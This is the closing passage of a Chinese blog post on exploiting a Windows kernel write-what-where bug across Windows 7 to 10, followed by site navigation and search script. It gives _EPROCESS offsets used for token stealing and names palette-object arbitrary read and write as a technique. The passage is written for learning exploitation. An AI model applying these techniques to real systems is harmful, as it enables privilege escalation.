+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dt nt!_EPROCESS uniqueprocessid token activeprocesslinks</span><br><span class="line">   +0x2e0 UniqueProcessId    : Ptr64 Void</span><br><span class="line">   +0x2e8 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x358 Token              : _EX_FAST_REF</span><br></pre></td></tr></table></figure>
+<h2 id="RS3"><a href="#RS3" class="headerlink" title="RS3"></a>RS3</h2><p>RS3版本中 PvScan0 已经放进了堆中，既然是堆的话，又让人想到了堆喷射控制内核池，总之可以尝试一下这种方法</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/9.png" alt="1564977577246"></p>
+<p>但是前辈们总有奇特的想法，又找到了另外一个对象 platte ，它类似与 bitmap 结构，可以用 <code>CreatePalette</code> 函数创建，结构如下</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/10.png" alt="1564986199191"></p>
+<p>任意读写的方法只是改为了<code>GetPaletteEntries</code>和<code>SetPaletteEntries</code>，以后可以尝试一下这个思路</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/11.png" alt="1564986238536"></p>
+<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>利用里面，win8.1的坑比较多，和win7比起来差距有点大，需要细心调试，更往后的版本主要是参阅外国的文献，以后有时间再来实践</p>
+<p>参考资料：</p>
+<p>[+] SMEP原理及绕过：<a href="http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html" target="_blank" rel="noopener">http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html</a></p>
+<p>[+] ROP的选择：<a href="http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html" target="_blank" rel="noopener">http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html</a></p>
+<p>[+] Bitmap结构出处：<a href="http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/" target="_blank" rel="noopener">http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/</a></p>
+<p>[+] wjllz师傅的博客：<a href="https://redogwu.github.io/" target="_blank" rel="noopener">https://redogwu.github.io/</a></p>
+<p>[+] 参阅过的pdf：<a href="https://github.com/ThunderJie/Study_pdf" target="_blank" rel="noopener">https://github.com/ThunderJie/Study_pdf</a></p>
+<p>[+] RS2上的利用分析：<a href="https://www.anquanke.com/post/id/168441#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168441#h2-3</a></p>
+<p>[+] RS3上 platte 对象的利用分析：<a href="https://www.anquanke.com/post/id/168572" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168572</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-What-Where/" rel="tag"><i class="fa fa-tag"></i> Write What Where</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/19/CVE-2016-0095/" rel="next" title="CVE-2016-0095">
+                <i class="fa fa-chevron-left"></i> CVE-2016-0095
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/08/glibc-heap/" rel="prev" title="glibc heap">
+                glibc heap <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Thunder_J</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/ThunderJie" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/thunder-j/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-compass"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://blog.csdn.net/CharlesGodX/" target="_blank" title="csdn"><i class="fa fa-fw fa-copyright"></i>csdn</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/ThunderJ17" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00：前言"><span class="nav-number">1.</span> <span class="nav-text">0x00：前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01：Windows-7-x64利用"><span class="nav-number">2.</span> <span class="nav-text">0x01：Windows 7 x64利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02：Windows-8-1-x64利用"><span class="nav-number">3.</span> <span class="nav-text">0x02：Windows 8.1 x64利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SMEP"><span class="nav-number">3.1.</span> <span class="nav-text">SMEP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadgets"><span class="nav-number">3.2.</span> <span class="nav-text">ROPgadgets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BITMAP对象"><span class="nav-number">3.3.</span> <span class="nav-text">BITMAP对象</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意读写"><span class="nav-number">3.4.</span> <span class="nav-text">任意读写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#整合思路"><span class="nav-number">3.5.</span> <span class="nav-text">整合思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03：Windows-8-1-x64的一个坑"><span class="nav-number">4.</span> <span class="nav-text">0x03：Windows 8.1 x64的一个坑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02：Windows-10-1511-1607-x64下的利用"><span class="nav-number">5.</span> <span class="nav-text">0x02：Windows 10 1511-1607 x64下的利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03：Windows-10-后续版本的猜想"><span class="nav-number">6.</span> <span class="nav-text">0x03：Windows 10 后续版本的猜想</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RS2"><span class="nav-number">6.1.</span> <span class="nav-text">RS2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RS3"><span class="nav-number">6.2.</span> <span class="nav-text">RS3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03：后记"><span class="nav-number">7.</span> <span class="nav-text">0x03：后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright"> &copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Thunder_J</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">328k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">4:58</span>
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.2</div>
+
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:
+  <span id="busuanzi_value_site_uv"></span>
+  人
+</span>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    总访问量
+    <span id="busuanzi_value_site_pv"></span>
+    次
+</span>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
